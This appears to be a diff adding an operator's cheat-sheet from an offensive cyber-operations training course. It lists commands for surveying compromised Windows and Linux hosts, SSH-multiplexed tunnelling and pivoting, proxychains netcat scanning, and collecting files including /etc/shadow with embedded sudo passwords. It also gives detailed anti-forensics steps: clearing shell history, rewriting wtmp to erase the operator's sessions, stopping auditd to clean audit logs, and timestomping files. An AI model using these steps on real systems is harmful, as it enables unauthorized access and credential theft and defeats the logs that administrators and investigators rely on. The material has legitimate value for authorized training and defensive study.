@@ -1,0 +1,276 @@
+
+
+## SSH Multiplexing
+# initial
+ssh -MS /tmp//working/t#.ssh -x -v -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L tport:tip:tport user@ip -p port
+# forwarding
+ssh -S /tmp/working/t#.ssh dummy@dummy -O forward -L tport:tip:tport 
+# additional
+ssh -MS /tmp/working/t#.ssh -x -v -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L tport:tip:tport user@127.1 -p port
+
+###################################################################################################
+##########################################  Win Survey  ###########################################
+###################################################################################################
+-------------  Upon Connection  -------------
+
+echo %DATE%%TIME%
+ipconfig /all
+tasklist /V /FO:list
+netstat /anob 
+query user  ||  query session
+ver
+systeminfo
+auditpol /get /category:*
+netsh advfirewall show allprofiles
+net share
+reg query HKLM\software\microsoft\windows\currentversion\run
+reg query HKLM\software\microsoft\windows\currentversion\runonce
+reg query hklm\software\microsoft\windows\currentversion\runonceex
+reg query HKCU\software\microsoft\windows\currentversion\run
+reg query HKCU\software\microsoft\windows\currentversion\runonce
+dir /a /od c:\progra~1\
+dir /a /od c:\progra~2\
+reg query HKCU\software\
+sc query
+driverquery
+driverquery /si
+at
+schtasks /query
+	# schtasks /query /V /FO:list | finstr <task>
+dir /a /od c:\ c:\windows\temp\ c:\windows\
+dir /a /od c:\windows\system32
+dir /a /od c:\windows\system32\winevt\logs
+dir /a /od "%appdata%\microsoft\windows\start menu\programs\startup"
+dir /a /od c:\windows\prefetch
+dir /a /od c:\programdata
+
+##check posh version
+reg query hklm\software\microsoft\powershell\1\powershellengine	 # if this key exists then ignore the other key b/c it will only report this version
+reg query hklm\software\microsoft\powershell\3\powershellengine   
+
+##look for other drives of interest
+wmic logicaldisk get name,filesystem,providername,description
+wmic logicaldisk get caption
+
+wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir) 
+
+echo %DATE%%TIME%
+
+________________________________________________________________________________________________
+----------  Malware Triage  -------------
+tasklist /svc
+net start
+wmic process get processid, parentprocessid, executablepath, commandline
+wmic /namespace:\\root\wmi PATH MSNdis_currentpacketfilter
+tasklist /svc | findstr /rvi "n/a"
+
+________________________________________________________________________________________________
+-------------  Before Disconnect  -------------
+
+dir /o:d /t:w c:\windows\temp
+dir /o:d /t:w c:\windows\system32\winevt\logs
+wevtutil qe security /c:25 /rd:true /f:text 
+ (whatever has updated from previous dir)
+query user  ||  query session
+netstat /anob
+tasklist /V /FO:list
+
+echo %DATE%%TIME%
+
+________________________________________________________________________________________________
+----------  Other  -------------
+## find all the docs (win)
+dir c:\ /S *.txt *.pdf *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.html *.htm | more
+arp -a
+route print
+
+###################################################################################################
+###########################################  Nix Survey ###########################################
+###################################################################################################
+Upon Connection:
+
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w; id; uname -a; date; date -u; pwd; ps -p $$
+ip neigh
+ip addr || ifconfig -a
+
+ps -efH --sort=start_time
+netstat -auntp || ss -a && ss -lp
+w 
+last; lastlog
+cat /etc/*elease*
+mount
+df -h
+df -li   
+   #list number inodes, tells us how long a system find will take
+ls -latr /var/*log*/ /var/*acc* /var/account/*
+ls -la /etc/*syslog*
+ls -latr / /tmp .. . /var/tmp /dev/shm /home
+for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; sudo cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
+ls -la /etc/cron.*
+sestatus || getenforce
+cat /etc/selinux/semanage.conf
+cat ~/.bash_history 
+
+## if you have access to root
+su
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+w
+last; lastb -20; lastlog
+lsmod | grep ipt || cat /proc/modules | grep ipt
+iptables -nv -L
+ls -latr /var/log/*
+cat /var/log/* 
+ls -latr /root
+ls -latr /var/spool/cron | tail -n 1000 <files in /var/spool/cron/>
+cat /etc/rsyslog.conf
+cat /etc/rsyslog.d/*.conf
+cat /etc/crontab
+cat /root/.bash_history
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<duration since initial connection> -type f -print0 | xargs -0 sudo ls -latr 
+	(NOTE there is a "-" a.k.a minus symbol preceding the "<duration since initial connection">
+
+s
+________________________________________________________________________________________________
+----------  Malware Triage  -------------
+ls -latr /proc     #shows all processes with associated files
+-maps: shows shared objects mapped to process memory
+-exe: a copy or link to binary used to execute process
+-cmdline: the command w/ args that started the proc
+-cwd: the current working dir
+-fd: show file descriptors in use by proc
+
+strings <file>   #print readable chars in a file
+
+#pull a binary from proc mem
+file <file>   # gives file type and build info
+ldd <file>   #lists dynamic libraries loaded by proc
+
+lsof -Pnp <pid>
+-P: dont resolve port numbers
+-n: dont resolve hostnames
+-p: selects based on PID
+
+
+_________________________________________________________________________________________________
+-------------  Before Disconnect  -------------
+
+ls -latr /tmp /var/log / .. .
+ps -efH --sort=start_time
+sudo netstat -lptn
+sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -60 -type f -print0 | xargs -0 sudo ls -latr 
+date -u
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+history -c
+exit
+ ## if you were root, exit again
+
+unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
+history -c
+exit
+
+________________________________________________________________________________________________
+----------  Other  -------------
+lspci -vv
+arp -a
+arp -a | grep -v incomplete
+sudo fdisk -l
+
+## scp over ssh 
+scp -o ControlPath=/tmp/t2 -P 6002 root@localhost:/pathto/file /savepath/filename.txt
+-r ' recursive : used to copy directories
+
+## IP Tables forwarding
+# verify it is allowed:
+sysctl net.ipv4.ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+# enable:
+sysctl -w net.ipv4.ip_forward=1
+echo 1> /proc/sys/net/ipv4/ip_forward
+
+-I PREROUTING -t nat -p tcp -m tcp -d $yours_wan_ip --dport 8001 -j DNAT --to-destination 192.168.1.200:8080
+-I FORWARD -m state -p tcp -d 192.168.1.200 --dport 8080 --state NEW,ESTABLISHED,RELATED -j ACCEPT
+-I POSTROUTING -t nat -p tcp -m tcp -s 192.168.1.200 --sport 8080 -j SNAT --to-source $yours_wan_ip
+
+## copy file using xxd
+xxd -p filename
+xxd -r -p filename newfilename
+
+## manual netcat scan
+for i in {10,23,12,9} ; do for j in {22,111,139} ; do proxychains nc -nvtz 10.169.0.$i $j ; done ; done
+
+## SUDO OVER RESTRICTED SSH
+
+ssh -S /tmp/Tgt6.sock student12@127.1 "echo 'password12' | sudo -S cat PPGSSS.jpeg" >> /root/Jones_12-03-20_Op4/PPGSSS.jpeg
+
+
+
+
+##############################
+File Hashing / Collection
+##############################
+powershell get-filehash -algorithm md5 -path '"c:\windows\system32\winevt\logs\microsoft-windows-user control panel%4operational.evtx"'
+
+for %F in ("c:\windows\system32\winevt\logs") do certutil -hashfile "%F" MD5
+
+certutil -hashfile %F MD5
+MD5             8D3893514FA1E5FC9AC0A10446AF50BE                                       C:\Program
+-----MD5 hash all files in a dir-----
+find /stafford_03-11-20_DRUN3/*.jpg -type f -exec md5sum {} + 
+find /stafford_06-11-20_002/t5_AD_Emails/* -type f -exec md5sum {} + > ./t5_AD_post.txt
+
+-----Recursive SCP-----
+scp -r -o ControlPath=/tmp/t4 student21@127.1:path/to/file /target/directory
+
+scp -o ControlPath=/tmp/t6 student21@127.1:/etc/shadow /stafford_30-10-20_DRUN2/t6_shadow
+
+scp -o ControlPath=/tmp/t7 -T student21@127.1:'"c:\sfk.exe"' /stafford_30-10-20_DRUN2/t7_sfk
+
+ssh -S /tmp/t4 "cat <file>" > <file>		download via ssh remote command
+
+ssh -S /tmp/t2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null dummy@dummy "echo 'password21' | sudo -S ls -alR /" >>  survey_192.168.0.10
+
+ssh -S /tmp/t6 dummy@dummy "date" >> Survey_10.123.169.35
+ssh -S /tmp/t6 dummy@dummy "echo 'P455w0rd' | sudo -S ls -alR /" >> Survey_10.123.169.35
+ssh -S /tmp/t10 dummy@dummy "wmic service list full" >> Survey_192.169.117.207
+
+##############################
+Logs
+##############################
+#Only clean logs as directed. You will not clean binary logs in T10 BOC
+lastlog
+	lastlog -C <user>
+wtmp (or utmp or btmp)
+	su
+	utmpdump /var/log/wtmp > /dev/shm/.a && tail -20 /dev/shm/.a		# ID offending proc IDs that need to be cleaned out
+	tail -20 /var/log/wtmp | egrep -v "<proc id>" > /dev/shm/.b && tail -20 /dev/shm/.b		## is it clean? if not then add more proc ids until g2g
+	utmpdump -r /dev/shm/.b > /dev/shm/.wtmp && last -f /dev/shm/.wtmp	#reverse our clean log back into binary
+	cat /dev/shm/.wtmp > /var/log/wtmp & last				# if it all looks good then we can cleanup 
+	rm -f /dev/shm/.b /dev/shm/.a /dev/shm/.wtmp
+	ls -latr /dev/shm
+	touch -t YYYYMMDDhhmm.ss /var/log/wtmp					# use the last entry from wtmp to timestomp
+	ls -latr /var/log/wtmp
+	exit
+
+## All ASCII log cleaning is performed the same way except without the use of utmpdump
+#Audit.log 	#have to sudo su and perform cleaning as root. 
+su
+service auditd stop
+## clean logs ##
+service auditd start						#restart service
+exit								#gtfo
+
+##############################
+Linux Timestomp
+##############################
+stat	shows file MACs and size data
+touch -r <refernce file> <target file>
+touch -t YYYYMMDDhhmm.ss <target file>
+
+
+
+
